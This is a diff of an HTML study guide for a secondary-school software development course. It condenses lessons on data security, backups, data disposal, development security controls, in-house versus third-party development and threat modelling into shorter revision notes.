-    <tr><td class="num">R1</td><td>Mitigate</td><td>Schedule regular library updates</td><td>Alex (DevOps)</td></tr>
-    <tr><td class="num">R2</td><td>Avoid</td><td>Implement multi-factor authentication</td><td>Jamie (Backend Dev)</td></tr>
-    <tr><td class="num">R3</td><td>Mitigate</td><td>Set up automated backups before deployment</td><td>Taylor (SysAdmin)</td></tr>
-    <tr><td class="num">R4</td><td>Mitigate</td><td>Add input validation checks and peer reviews</td><td>Morgan (Frontend Dev)</td></tr>
-  </table>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Name the four secure onboarding practices.</li>
-      <li>Give the four steps of risk management and apply them to "delayed patching".</li>
-      <li>What are the four column groups of a risk register?</li>
-    </ol>
-  </div>
-</section>
-<!-- ═══════════════ W3 L1 ═══════════════ -->
-<section class="lesson pagebreak">
-  <h2><span class="wk">Week 3 · Lesson 1</span>Security of Data</h2>
-  <p class="intro">Why data is valuable, what makes data secure, backup strategy, and how data should be disposed of.</p>
-
-  <h3><span class="tag">Value</span>Why data is valuable</h3>
-  <p>Data is valuable to individuals and organisations alike. If a hard disk crashed tomorrow with no backup, the things lost would be <b>original and irreplaceable</b> — they took real time and effort to create, and can't simply be downloaded again.</p>
-  <div class="split">
-    <div class="box plain">
-      <div class="lab">What you'd lose at home</div>
-      <p>Unfinished or completed school work, projects, photos and saved articles. Losing access to an email account also means losing sent and received emails, your address book, bookmarks, and all the preferences set up in your favourite programs.</p>
-    </div>
-    <div class="box plain">
-      <div class="lab">What a business would lose</div>
-      <ul>
-        <li>Client lists, payroll information, tax records.</li>
-        <li>Accounting and transaction details.</li>
-        <li>Records of who owes the business money, and who it owes.</li>
-      </ul>
-    </div>
-  </div>
-  <div class="box warn">
-    <div class="lab">Why it would be catastrophic</div>
-    <ul>
-      <li>The business wouldn't know its customers or how to contact them.</li>
-      <li>Staff couldn't be paid, and income would drop to zero.</li>
-      <li>The tax department and creditors could pursue legal action.</li>
-      <li>Trade secrets would be lost, and reputation as a trustworthy organisation would suffer.</li>
-      <li>A privacy policy violation could occur if personal information is damaged or released.</li>
-    </ul>
-    <p>Computers can be replaced almost instantly since they're insured — <b>the data on them can't be</b>. Re-entering everything lost in a major system crash could take months or years and cost a fortune.</p>
-  </div>
-
-  <div class="box def">
-    <div class="lab">Definition</div>
-    <p><b>Data security</b> is making sure only the people who should be able to <b>read</b> the data can read it, and only the people who should be able to <b>write</b> it can write it. It's implemented through equipment such as a network operating system with user authentication, and measures such as organisational password policies.</p>
-  </div>
-
-  <h3><span class="tag">Characteristics</span>What makes information secure</h3>
-  <table>
-    <thead><tr><th style="width:32mm">Characteristic</th><th>What it means</th></tr></thead>
-    <tr><td class="who">Protected</td><td>User authentication protects information with passwords. Firewalls, anti-malware and antivirus software are kept up to date. Physical storage is protected with access restrictions, locks, guards and/or alarms.</td></tr>
-    <tr><td class="who">Confidential</td><td>People only have access to information they need. The <b>Privacy and Data Protection Act 2014</b> requires that sensitive information only be made available on a <b>'need to know' basis</b>.</td></tr>
-    <tr><td class="who">Risk managed</td><td>Regular backups are taken in case of data loss. Safety equipment (ventilation, fire extinguishers, alarms) is fitted in secure data centres, and an emergency <b>business continuity plan</b> is in place.</td></tr>
-  </table>
-
-  <h3><span class="tag">Backups</span>Frequency &amp; the 3-2-1 rule</h3>
-  <div class="box def">
-    <div class="lab">Definition</div>
-    <p>A <b>backup</b> is a copy of data that can be recovered in the event of a primary data failure, allowing data to be restored from an earlier point in time. Primary failures can result from hardware or software failure, data corruption, or human-caused events such as malware or accidental deletion.</p>
-  </div>
-  <p>The more time between backups, the more potential data loss when recovering. Retaining multiple copies gives the flexibility to restore to a point unaffected by corruption or attack. A good backup system typically includes:</p>
-  <ul>
-    <li><b>Daily</b> incremental backups to a portable device and/or cloud storage.</li>
-    <li><b>End-of-week</b> server backups.</li>
-    <li><b>Quarterly and yearly</b> server backups.</li>
-  </ul>
-  <p>It's vital to <b>regularly check and test that you can actually restore</b> your data from a backup.</p>
-  <table>
-    <thead><tr><th style="width:12mm">Rule</th><th style="width:40mm">Requirement</th><th>Detail</th></tr></thead>
-    <tr><td class="num">3</td><td class="who">Three copies</td><td>Keep at least three copies of any important files or data — the original and two backups.</td></tr>
-    <tr><td class="num">2</td><td class="who">Two media types</td><td>Keep the files or data on two different types of media.</td></tr>
-    <tr><td class="num">1</td><td class="who">One offsite</td><td>Keep one copy offsite, away from the original location.</td></tr>
-  </table>
-  <div class="box plain">
-    <div class="lab">Variation — the 3-2-1-1 rule</div>
-    <p>The 3-2-1 rule is a <b>minimum starting point</b>. A common variation keeps <b>two</b> offsite copies instead of one: one in the cloud (online), and one that is both offsite <i>and</i> offline — e.g. an external hard drive or tape stored at a different physical location.</p>
-  </div>
-
-  <h4>Essential Eight — daily backups maturity</h4>
-  <p>The Australian Signals Directorate's ACSC treats daily backups as essential to protect against malware and recover data and system availability. All businesses should aim for <b>maturity level three</b>.</p>
-  <table>
-    <thead><tr><th style="width:26mm"></th><th>Maturity level 1</th><th>Maturity level 2</th><th>Maturity level 3</th></tr></thead>
-    <tr><td class="who">Frequency</td><td>Monthly</td><td>Weekly</td><td><b>At least daily</b></td></tr>
-    <tr><td class="who">Storage</td><td>—</td><td>Offline, or online in a non-rewritable, non-erasable manner</td><td>Offline, or online in a non-rewritable, non-erasable manner</td></tr>
-    <tr><td class="who">Retention</td><td>One to three months</td><td>One to three months</td><td><b>Three months or greater</b></td></tr>
-    <tr><td class="who">Full restoration</td><td>—</td><td>Tested at least once</td><td>Tested at initial implementation and each time infrastructure changes</td></tr>
-    <tr><td class="who">Partial restoration</td><td>Tested annually or more often</td><td>Tested bi-annually or more often</td><td>Tested quarterly or more often</td></tr>
-  </table>
-
-  <h3><span class="tag">Disposal</span>Getting rid of data properly</h3>
-  <div class="box def">
-    <div class="lab">Definition</div>
-    <p><b>Data disposal</b> is the destruction, transfer, damage or alteration of data.</p>
-  </div>
-  <div class="box law">
-    <div class="lab">Victorian Information Privacy Principles</div>
-    <p>Under <b>IPP 4.2</b>, organisations must take reasonable steps to <b>destroy or permanently de-identify</b> personal information no longer needed for any purpose. <b>IPP 1.1</b> suggests minimising the need to dispose of data in the first place, by limiting how much identifiable information is collected.</p>
-  </div>
-  <div class="box law">
-    <div class="lab">Public Records Act 1973</div>
-    <p>Public records cannot be destroyed unless authorised. The <b>Public Records Office Victoria (PROV)</b> can issue three types of authority to destroy:</p>
-    <ul>
-      <li><b>Normal Administrative Practice (NAP)</b></li>
-      <li><b>Retention and Disposal Authority (RDA)</b></li>
-      <li><b>Single Instance Disposal Authority (SIDA)</b></li>
-    </ul>
-    <p>Once authority to destroy is issued, information must be destroyed or de-identified, unless another legitimate purpose exists for retaining it.</p>
-  </div>
-  <h4>Normal Administrative Practice covers</h4>
-  <ul>
-    <li>Transitory messages — e.g. calendars, personal emails.</li>
-    <li>Rough working papers — e.g. rough meeting notes.</li>
-    <li>Drafts not intended for further reference.</li>
-    <li>Copies retained for reference purposes only.</li>
-    <li>Published material not included in the organisation's records.</li>
-  </ul>
-
-  <h4>Destroying physical information</h4>
-  <ul>
-    <li><b>Shredding</b> — cross-shredding may be needed for sensitive documents.</li>
-    <li><b>Pulping</b> — reduces paper to fibres.</li>
-    <li><b>Burning</b> — only as a last resort, in an appropriate industrial facility.</li>
-  </ul>
-
-  <div class="box warn">
-    <div class="lab">Deletion doesn't mean destruction</div>
-    <p>Deleting digital information only removes the <b>pointer</b> (the file name and directory path) to that information. The actual data is gradually overwritten by new data over time — <b>until it's fully overwritten, it can still be retrieved with recovery tools</b>.</p>
-  </div>
-
-  <h4>Sanitisation methods</h4>
-  <p>Sanitisation is the process of erasing or overwriting information on digital media. The method chosen depends on the information's classification and a risk assessment of its sensitivity.</p>
-  <table>
-    <tr><td class="who" style="width:28mm">Clearing</td><td>Information is overwritten and hidden under nonsensical data so it can't be retrieved via disk or file recovery utilities.</td></tr>
-    <tr><td class="who">Purging</td><td>Information is randomised so it can't be reconstructed, even using nonstandard systems outside its usual environment (a "laboratory attack").</td></tr>
-    <tr><td class="who">Degaussing</td><td>Recorded data is erased by demagnetising magnetic media.</td></tr>
-    <tr><td class="who">Destruction</td><td>The most extreme form; the media is drastically altered and can never be reused.</td></tr>
-  </table>
-  <p><b>Physical destruction methods:</b> shredding, disintegration, incineration, pulverisation and melting. To ensure complete destruction, find and destroy <b>all</b> copies — including system backups, the cloud, and offsite storage. Where information is stored in the cloud, contracts should stipulate that all copies will be destroyed under retention and disposal requirements.</p>
-  <div class="box warn">
-    <div class="lab">Wiping devices properly</div>
-    <p>Un-wiped hard drives are sought after by scammers. <b>Factory resetting and deleting data alone isn't enough</b> to prevent recovery. For phones, tablets and solid state drives (SSDs), <b>encryption can be used before resetting</b> to prevent any remaining data from being recovered.</p>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Give the three characteristics of secure information, and the Act that requires confidentiality.</li>
-      <li>State the 3-2-1 rule and the 3-2-1-1 variation.</li>
-      <li>What are the three requirements for Essential Eight maturity level 3 backups?</li>
-      <li>Explain why "delete" doesn't destroy data, and name the four sanitisation methods.</li>
-      <li>What are PROV's three authorities to destroy?</li>
-    </ol>
-  </div>
+  <p style="color:var(--ink-soft)"><b>Register structure:</b> identification (ID · risk · category · cause) → assessment (likelihood · impact · risk level) → response (strategy · action plan · responsible) → monitoring (method · frequency · status).</p>
 </section>
 
-<!-- ═══════════════ W3 L2 ═══════════════ -->
 <section class="lesson">
-  <h2><span class="wk">Week 3 · Lesson 2</span>Security Controls in Software Development</h2>
-  <p class="intro">Six essential security controls developers use to protect data, with a closer look at version control and identity &amp; access management.</p>
-
-  <div class="box plain">
-    <div class="lab">Context — developers as guardians of data</div>
-    <p>Software powers schools, hospitals, banks, social media and government services — and all of it stores something precious: <b>data</b>. As developers, every design choice and every line of code can help protect (or accidentally endanger) users' personal data. Secure software development isn't just about the end product, it's about <b>how the product is made, who can access it, how it's stored, and how it's maintained over time</b>.</p>
+  <h2><span class="wk">Week 3 · Lesson 1</span>Security of Data</h2>
+  <h3>Why data is valuable</h3>
+  <p>If a hard disk crashed with no backup, what's lost is <b>original and irreplaceable</b>. A business loses client lists, payroll, tax records, accounting and transaction details, and records of debts owed both ways.</p>
+  <div class="box warn">
+    <div class="lab">Why that would be catastrophic</div>
+    <p>The business wouldn't know its customers or how to contact them · staff couldn't be paid and income would drop to zero · the tax department and creditors could pursue legal action · trade secrets and reputation gone · a privacy policy violation if personal information is damaged or released. <b>Computers are insured and replaceable; the data isn't.</b></p>
   </div>
-
-  <h3><span class="tag">Overview</span>Six essential security controls</h3>
+  <div class="box def">
+    <div class="lab">Definition</div>
+    <p><b>Data security</b> — making sure only the people who should <b>read</b> data can read it, and only those who should <b>write</b> it can write it. Implemented through equipment (a network OS with user authentication) and measures (organisational password policies).</p>
+  </div>
+  <h3>Characteristics of secure information</h3>
+  <ul>
+    <li><b>Protected</b> — user authentication with passwords; firewalls, anti-malware and antivirus kept current; physical storage with access restrictions, locks, guards, alarms.</li>
+    <li><b>Confidential</b> — access only to information people need. The <b>PDP Act 2014</b> requires sensitive information on a <b>'need to know' basis</b>.</li>
+    <li><b>Risk managed</b> — regular backups; ventilation, fire extinguishers and alarms in data centres; an emergency <b>business continuity plan</b>.</li>
+  </ul>
+  <h3>Backups</h3>
+  <p>A <b>backup</b> is a copy recoverable after a primary data failure — hardware or software failure, corruption, or human-caused events such as malware or accidental deletion. The more time between backups, the more data is lost. A good system: <b>daily</b> incremental to portable device and/or cloud · <b>end-of-week</b> server · <b>quarterly and yearly</b> server. Always <b>test that you can actually restore</b>.</p>
+  <ul>
+    <li><b>3</b> — three copies: the original and two backups.</li>
+    <li><b>2</b> — two different media types.</li>
+    <li><b>1</b> — one copy offsite, away from the original location.</li>
+    <li><b>3-2-1-1</b> — a variation keeping <b>two</b> offsite copies: one cloud (online), one offsite <i>and</i> offline.</li>
+  </ul>
   <table>
-    <thead><tr><th style="width:50mm">Security control</th><th style="width:48mm">What it does</th><th>Why it's important</th></tr></thead>
-    <tr><td class="who">Version control &amp; repositories</td><td>Tracks and manages code</td><td>Helps control access and recover from errors</td></tr>
-    <tr><td class="who">Identity &amp; access management (IAM)</td><td>Manages user access</td><td>Prevents unauthorised access</td></tr>
+    <thead><tr><th style="width:20mm">E8 backups</th><th>ML1</th><th>ML2</th><th>ML3 — aim here</th></tr></thead>
+    <tr><td class="who">Frequency</td><td>Monthly</td><td>Weekly</td><td><b>At least daily</b></td></tr>
+    <tr><td class="who">Storage</td><td>—</td><td>Offline or non-rewritable</td><td>Offline or non-rewritable</td></tr>
+    <tr><td class="who">Retention</td><td>1–3 months</td><td>1–3 months</td><td><b>3 months or greater</b></td></tr>
+    <tr><td class="who">Full restore</td><td>—</td><td>Tested once</td><td>At implementation and every infrastructure change</td></tr>
+    <tr><td class="who">Partial restore</td><td>Annually</td><td>Bi-annually</td><td>Quarterly or more often</td></tr>
+  </table>
+  <h3>Data disposal</h3>
+  <p><b>Data disposal</b> — the destruction, transfer, damage or alteration of data. <b>IPP 4.2</b>: take reasonable steps to destroy or permanently de-identify personal information no longer needed. <b>IPP 1.1</b>: minimise the need by collecting less identifiable information.</p>
+  <p><b>Public Records Act 1973</b> — public records can't be destroyed unless authorised. <b>PROV</b> issues three authorities: <b>NAP</b> (normal administrative practice), <b>RDA</b> (retention and disposal authority), <b>SIDA</b> (single instance disposal authority). NAP covers transitory messages, rough working papers, drafts not for further reference, reference copies, and published material not in the records.</p>
+  <div class="box warn">
+    <div class="lab">Deletion ≠ destruction</div>
+    <p>Deleting removes only the <b>pointer</b> — the file name and directory path. The data is gradually overwritten over time, and until it is fully overwritten it can still be retrieved with recovery tools.</p>
+  </div>
+  <ul>
+    <li><b>Clearing</b> — overwritten and hidden under nonsensical data so disk or file recovery utilities can't retrieve it.</li>
+    <li><b>Purging</b> — randomised so it can't be reconstructed even by a "laboratory attack" outside its usual environment.</li>
+    <li><b>Degaussing</b> — erasing by demagnetising magnetic media.</li>
+    <li><b>Destruction</b> — the most extreme; media drastically altered and never reused.</li>
+  </ul>
+  <p><b>Physical methods:</b> shredding (cross-shredding for sensitive documents), pulping, burning as a last resort in an industrial facility; digitally, shredding, disintegration, incineration, pulverisation and melting. Destroy <b>all</b> copies — system backups, cloud and offsite; cloud contracts should stipulate destruction. <b>Factory reset isn't enough</b>: for phones, tablets and SSDs, encrypt <i>before</i> resetting so remaining data can't be recovered.</p>
+</section>
+
+<section class="lesson">
+  <h2><span class="wk">Week 3 · Lesson 2</span>Security Controls in Development</h2>
+  <p>Every design choice and line of code can protect or endanger users' data. Secure development is about <b>how the product is made, who can access it, how it's stored, and how it's maintained</b>.</p>
+  <table>
+    <thead><tr><th style="width:34mm">Control</th><th style="width:34mm">What it does</th><th>Why it's important</th></tr></thead>
+    <tr><td class="who">Version control &amp; repositories</td><td>Tracks and manages code</td><td>Controls access and recovers from errors</td></tr>
+    <tr><td class="who">Identity &amp; access management</td><td>Manages user access</td><td>Prevents unauthorised access</td></tr>
     <tr><td class="who">Encryption</td><td>Protects data</td><td>Keeps information safe even if breached</td></tr>
     <tr><td class="who">Code review</td><td>Peer-checks code</td><td>Identifies security issues early</td></tr>
     <tr><td class="who">Updates / patches</td><td>Fixes vulnerabilities</td><td>Reduces risk from known exploits</td></tr>
     <tr><td class="who">Environment separation</td><td>Isolates app stages</td><td>Keeps real data and users safe</td></tr>
   </table>
-
-  <h3><span class="tag">Control 1</span>Version control</h3>
-  <p>Also known as <b>source control</b> — a management strategy used to track and store changes to software development files across the whole project lifecycle. Without it, every change would overwrite the last, like an essay where old drafts vanish forever.</p>
-  <p>Tools such as <b>Git</b>, and platforms such as <b>GitHub</b>, let developers safely make changes, fix bugs, experiment with new features, and undo mistakes — like an unlimited "undo" button with collaboration features built in. Code stored in repositories can be shared, reviewed and automatically backed up.</p>
-  <div class="box plain">
-    <div class="lab">Why it matters for teams</div>
-    <p>Repositories let teams <b>restrict access</b>, so only approved users can change critical files or merge code into the main project. Every change is recorded with <b>who made it, when, and why</b> — a complete history in case anything goes wrong. Malicious or poorly written code can be traced and removed.</p>
-  </div>
-  <h4>What version control improves</h4>
+  <h3>Version control</h3>
+  <p>Also called <b>source control</b> — tracks and stores changes to development files across the whole project lifecycle. Without it every change overwrites the last, like an essay whose old drafts vanish. Tools such as <b>Git</b> and platforms such as <b>GitHub</b> let developers change, fix, experiment and undo — an unlimited "undo" button with collaboration built in.</p>
   <ul>
-    <li>Team productivity and collaboration.</li>
-    <li>Team communication with a reliable solution.</li>
-    <li>Fewer development errors and conflicts.</li>
-    <li>Faster development time and more successful deployments.</li>
-    <li>Customer satisfaction through more reliable software versions.</li>
+    <li>Repositories <b>restrict access</b> so only approved users change critical files or merge to main.</li>
+    <li>Every change records <b>who made it, when, and why</b> — malicious or poor code can be traced and removed.</li>
+    <li>Improves productivity and collaboration, team communication, error and conflict rates, development speed, deployment success, and customer satisfaction through more reliable versions.</li>
+    <li>Save changes <b>frequently and consistently</b> with comprehensible naming conventions.</li>
   </ul>
-  <p><b>Using it effectively:</b> changes should be saved frequently and consistently, using comprehensible naming conventions. Teams without version control often don't know which changes have been made available to users, and end up with incompatible changes between unrelated pieces of work that must be painstakingly untangled.</p>
   <div class="box mit">
-    <div class="lab">Key point — both tool and safety net</div>
-    <p>Version control protects source code from catastrophe — deliberate or accidental security or physical risks — and from the casual degradation of human error. In secure development it is <b>both a collaboration tool and a safety net</b>. As with any important data, regular backups should still be done.</p>
+    <div class="lab">Both tool and safety net</div>
+    <p>Version control protects source code from deliberate or accidental security and physical risks, and from the casual degradation of human error. <b>As with any important data, regular backups should still be done.</b></p>
   </div>
-
-  <h3><span class="tag">Control 2</span>Identity &amp; access management (IAM)</h3>
-  <p>Not everyone should have the keys to the kingdom. IAM is the practice of making sure that <b>each person only has the access they need</b>, nothing more.</p>
-  <p><i>Like a school building:</i> students, teachers and the principal all have access to different areas depending on their role. You wouldn't want a student wandering into the server room, and you wouldn't want just anyone editing school reports.</p>
-  <p>IAM uses <b>login credentials, multi-factor authentication (MFA), and role-based permissions</b> to keep systems organised and secure. This way, even if someone's password is stolen, the damage is limited.</p>
+  <h3>Identity &amp; access management</h3>
+  <p>Not everyone should have the keys to the kingdom — IAM ensures <b>each person only has the access they need</b>. Like a school building: students, teachers and the principal reach different areas; you wouldn't want a student in the server room. It uses <b>login credentials, MFA and role-based permissions</b>, so even a stolen password does limited damage.</p>
   <div class="box def">
     <div class="lab">Principle of least privilege</div>
-    <p>Give people the <b>minimum access they need</b> to do their job — for example, allowing a tester to view results but not change source code, or letting a junior developer work on a feature without touching the production database.</p>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Name the six security controls, and for each give the "why it matters" in your own words.</li>
-      <li>What three things does a repository record about every change?</li>
-      <li>Give two concrete examples of least privilege in a dev team.</li>
-    </ol>
+    <p>The <b>minimum access needed</b> to do the job — a tester views results but can't change source code; a junior developer works on a feature without touching the production database.</p>
   </div>
 </section>
-<!-- ═══════════════ W4 L1 ═══════════════ -->
-<section class="lesson pagebreak">
-  <h2><span class="wk">Week 4 · Lesson 1</span>In-House or External Development</h2>
-  <p class="intro">Weighing up whether to build software in-house or externally, and managing the risks that come with relying on third-party code.</p>
-
-  <p>When organisations need new software, they face an important decision: develop it <b>in-house</b>, using their own team of developers, or <b>externally</b>, by hiring a third party or using existing tools and services? Understanding the advantages and disadvantages of each helps guide better project planning, resource use and risk management. One key area of concern in external development is <b>third-party risk</b>, where organisations rely on software components or services built by others.</p>
-
-  <h3><span class="tag">Option 1</span>In-house development</h3>
-  <p>The design, development, testing and maintenance are carried out by the organisation's <b>own employees</b>. This gives full control over how the software is built and ensures it is tailored specifically to internal goals or client needs. In-house teams can communicate more efficiently with stakeholders, understand internal workflows, and adapt quickly to change.</p>
+<section class="lesson">
+  <h2><span class="wk">Week 4 · Lesson 1</span>In-House vs External Development</h2>
+  <p>Organisations must decide whether to build <b>in-house</b> with their own developers, or <b>externally</b> via a third party or existing tools. A key concern in external development is <b>third-party risk</b>.</p>
   <div class="ad">
     <div class="a">
-      <h4>Advantages</h4>
+      <h4>In-house — advantages</h4>
       <ul>
-        <li>Full control over how the software is built.</li>
-        <li>Tailored specifically to internal goals or client needs.</li>
-        <li>More efficient communication with stakeholders.</li>
+        <li>Full control over how software is built.</li>
+        <li>Tailored to internal goals or client needs.</li>
+        <li>Efficient stakeholder communication.</li>
         <li>Better understanding of internal workflows.</li>
         <li>Adapts quickly to change.</li>
       </ul>
     </div>
     <div class="d">
-      <h4>Disadvantages</h4>
+      <h4>In-house — disadvantages</h4>
       <ul>
-        <li>Resource-intensive — needs skilled developers, PMs, testers and support staff.</li>
-        <li>Higher costs, particularly for small or medium businesses.</li>
-        <li>Building complex features from scratch can be time-consuming.</li>
-        <li>Slower if the team lacks experience with certain tools or technologies.</li>
+        <li>Resource-intensive — developers, PMs, testers, support.</li>
+        <li>Higher costs, especially for small and medium businesses.</li>
+        <li>Complex features from scratch take time.</li>
+        <li>Slower if the team lacks tool experience.</li>
       </ul>
     </div>
   </div>
-  <p>Despite the challenges, in-house development remains popular for organisations with <b>sensitive data or unique business requirements</b>.</p>
-
-  <h3><span class="tag">Option 2</span>External / third-party development</h3>
-  <p>Relying on individuals or companies outside the organisation to provide software components or build applications — outsourcing to a third-party vendor, purchasing off-the-shelf software, or using open-source tools such as <b>APIs</b>, libraries and <b>SDKs</b>. Today, most developers combine in-house and third-party solutions to speed up development and focus on innovation instead of reinventing basic features.</p>
   <div class="ad">
     <div class="a">
-      <h4>Advantages</h4>
+      <h4>External — advantages</h4>
       <ul>
-        <li>Can significantly reduce time and cost.</li>
-        <li>Frees teams to focus on innovation instead of reinventing basic features.</li>
+        <li>Significantly reduces time and cost.</li>
+        <li>Frees teams to innovate rather than reinvent basic features.</li>
       </ul>
     </div>
     <div class="d">
-      <h4>Disadvantages</h4>
+      <h4>External — disadvantages</h4>
       <ul>
-        <li>Places trust in someone else's security practices, update cycles and reliability.</li>
-        <li>Disruptions or security incidents if a vendor stops supporting a component, or a library has vulnerabilities.</li>
-        <li>Licensing issues if terms of use aren't fully understood or followed.</li>
+        <li>Trusts another's security practices, update cycles and reliability.</li>
+        <li>Disruption if a vendor drops support or a library has flaws.</li>
+        <li>Licensing issues if terms aren't understood or followed.</li>
       </ul>
     </div>
   </div>
-
-  <h3><span class="tag">Risk</span>Third-party software</h3>
-  <p>Any external tools or code not developed by your own organisation — an SDK, an external API, a plug-in, or entire applications hosted on another platform. Developers use these to save time, reduce costs, and avoid rebuilding features already available elsewhere.</p>
-  <p><b>Why it's a problem:</b> these components may have vulnerabilities, outdated code or excessive permissions. If not carefully managed, they become the <b>weakest link</b> in a system's security — third parties might gain access to confidential data, especially if not restricted to only the parts of the system they need. Poorly written or unmonitored components can also lead to bugs, compatibility issues or compliance problems.</p>
-  <div class="box warn">
-    <div class="lab">Third-party risks include</div>
-    <ul>
-      <li>Vulnerabilities in external libraries or code can be exploited by attackers, <b>even if your own code is secure</b>.</li>
-      <li>External services may access sensitive files, user data, or system configurations <b>beyond what is necessary</b>.</li>
-      <li>Known flaws may remain unaddressed if security updates or patches aren't applied regularly.</li>
-      <li>Vendors may stop supporting or maintaining their products, creating reliability and availability concerns.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Tool</span>Software Composition Analysis (SCA)</h3>
-  <p>An automated technique that <b>scans the software codebase to identify all external components</b>. It provides visibility into what open-source or third-party tools are being used, and whether any have known vulnerabilities, licensing issues or outdated versions. SCA tools can tell whether your code is calling a vulnerable part of a library, and suggest ways to update or patch. They also help maintain legal compliance by checking whether licences attached to external code are compatible with your project's distribution.</p>
-  <div class="box mit">
-    <div class="lab">Benefits of SCA tools</div>
-    <ul>
-      <li>Automatically detect known security vulnerabilities in third-party libraries.</li>
-      <li>Highlight licensing obligations to help avoid legal risks.</li>
-      <li>Provide update recommendations when components are out of date.</li>
-      <li>Show whether vulnerable code is <b>actively used</b> by your application.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Controls</span>Encryption &amp; access control</h3>
-  <p><b>Encryption</b> ensures that even if data is intercepted or stolen, it remains unreadable without the proper decryption key. This is particularly important when third-party software handles or transmits user information, financial data or intellectual property.</p>
-  <p><b>Access control</b> limits what third-party software or vendors can see and do. Third-party code should only have access to the specific data and systems it needs to function. Applying the <b>principle of least privilege</b> reduces the chance that a bug or security issue in a third-party tool will impact the entire system. Monitoring and logging all external access provides further oversight.</p>
-  <div class="box mit">
-    <div class="lab">Security best practices</div>
-    <ul>
-      <li>Encrypt data both <b>during transmission and while stored</b>, using strong cryptographic standards.</li>
-      <li>Grant external systems or tools the <b>minimum level of access</b> required to function.</li>
-      <li>Monitor third-party activity and log access events for auditing and troubleshooting.</li>
-      <li>Regularly review third-party permissions and revoke unnecessary access rights.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Summary</span>In-house vs external, factor by factor</h3>
+  <p>In-house remains popular for organisations with <b>sensitive data or unique requirements</b>; most teams combine both approaches.</p>
   <table>
-    <thead><tr><th style="width:26mm">Factor</th><th style="width:62mm">In-house development</th><th>External / third-party development</th></tr></thead>
-    <tr><td class="who">Control</td><td>Full control over all aspects including customisation and decision-making</td><td>Limited control over external code, services and customisation</td></tr>
-    <tr><td class="who">Knowledge</td><td>Better knowledge of internal processes and operations</td><td>Lack of familiarity with business operations and internal process</td></tr>
-    <tr><td class="who">Cost</td><td>High cost (staff, tools, infrastructure)</td><td>Often more cost-effective due to reuse of existing tools</td></tr>
-    <tr><td class="who">Communication</td><td>Easier communication between parties involved</td><td>Slower communication as parties are external; miscommunication possible</td></tr>
-    <tr><td class="who">Speed</td><td>Slower, especially for complex projects</td><td>Faster due to reusable components and experienced vendors</td></tr>
-    <tr><td class="who">Security</td><td>Easier to manage and audit — confidential data kept in-house</td><td>Relies on third-party security practices, may introduce hidden flaws</td></tr>
-    <tr><td class="who">Customisation</td><td>Fully tailored to business needs</td><td>May be restricted by third-party limitations</td></tr>
-    <tr><td class="who">Maintenance</td><td>Internal responsibility and lower ongoing maintenance costs</td><td>Ongoing dependency on external contractors, possibly higher ongoing costs</td></tr>
-    <tr><td class="who">Legal risk</td><td>Full ownership of intellectual property</td><td>Must comply with licences and vendor terms</td></tr>
-    <tr><td class="who">Integration</td><td>Easier with existing systems</td><td>May require adapters or extra configuration</td></tr>
+    <thead><tr><th style="width:22mm">Factor</th><th>In-house</th><th>External / third-party</th></tr></thead>
+    <tr><td class="who">Control</td><td>Full, including customisation and decisions</td><td>Limited over external code and services</td></tr>
+    <tr><td class="who">Knowledge</td><td>Knows internal processes and operations</td><td>Unfamiliar with business operations</td></tr>
+    <tr><td class="who">Cost</td><td>High — staff, tools, infrastructure</td><td>Often cheaper through reuse</td></tr>
+    <tr><td class="who">Communication</td><td>Easier between parties involved</td><td>Slower; miscommunication possible</td></tr>
+    <tr><td class="who">Speed</td><td>Slower, especially complex projects</td><td>Faster via reusable components and experience</td></tr>
+    <tr><td class="who">Security</td><td>Easier to manage and audit; data stays in-house</td><td>Relies on third-party practice; hidden flaws</td></tr>
+    <tr><td class="who">Customisation</td><td>Fully tailored</td><td>Restricted by third-party limitations</td></tr>
+    <tr><td class="who">Maintenance</td><td>Internal; lower ongoing cost</td><td>Dependent on contractors; possibly higher</td></tr>
+    <tr><td class="who">Legal risk</td><td>Full ownership of IP</td><td>Must comply with licences and vendor terms</td></tr>
+    <tr><td class="who">Integration</td><td>Easier with existing systems</td><td>May need adapters or extra configuration</td></tr>
   </table>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Give three advantages and three disadvantages of each approach without looking.</li>
-      <li>Name the four third-party risks.</li>
-      <li>What four things does an SCA tool do?</li>
-      <li>Why does encryption matter specifically when third-party software is involved?</li>
-    </ol>
+  <h3>Third-party risk</h3>
+  <p><b>Third-party software</b> — any external SDK, API, plug-in or hosted application not built in-house. Used to save time and cost, but badly managed it becomes the <b>weakest link</b>.</p>
+  <ul>
+    <li>Vulnerabilities in external libraries can be exploited <b>even if your own code is secure</b>.</li>
+    <li>External services may access files, user data or configurations <b>beyond what is necessary</b>.</li>
+    <li>Known flaws remain if patches aren't applied regularly.</li>
+    <li>Vendors may stop supporting products — reliability and availability concerns.</li>
+  </ul>
+  <div class="box mit">
+    <div class="lab">Software Composition Analysis</div>
+    <p>An automated technique that <b>scans the codebase to identify all external components</b>. It detects known vulnerabilities in third-party libraries, highlights licensing obligations to avoid legal risk, recommends updates for outdated components, and shows whether vulnerable code is <b>actively used</b> by your application.</p>
+  </div>
+  <div class="box mit">
+    <div class="lab">Encryption &amp; access control</div>
+    <p><b>Encryption</b> keeps data unreadable without the key even if intercepted — important when third-party software handles user information, financial data or IP. <b>Access control</b> limits what vendors can see and do; <b>least privilege</b> reduces the chance a third-party bug affects the whole system.</p>
+    <p><b>Best practice:</b> encrypt in transit and at rest with strong standards · grant the minimum access needed · monitor and log all external access for auditing · regularly review and revoke unnecessary permissions.</p>
   </div>
 </section>
 
-<!-- ═══════════════ W4 L2 ═══════════════ -->
 <section class="lesson">
   <h2><span class="wk">Week 4 · Lesson 2</span>Threat Modelling Principles</h2>
-  <p class="intro">A structured, four-step approach to identifying and addressing potential security threats to software systems.</p>
-
   <div class="box def">
     <div class="lab">Definition</div>
-    <p>Threat modelling is a <b>structured approach to identifying and addressing potential security threats</b> to software systems. It's about <b>thinking like an attacker</b> to predict how a system could be exploited, and then acting to prevent those risks. Just like risk management plans for floods or fires, threat modelling prepares software to handle digital threats such as hacking, data leaks or unauthorised access.</p>
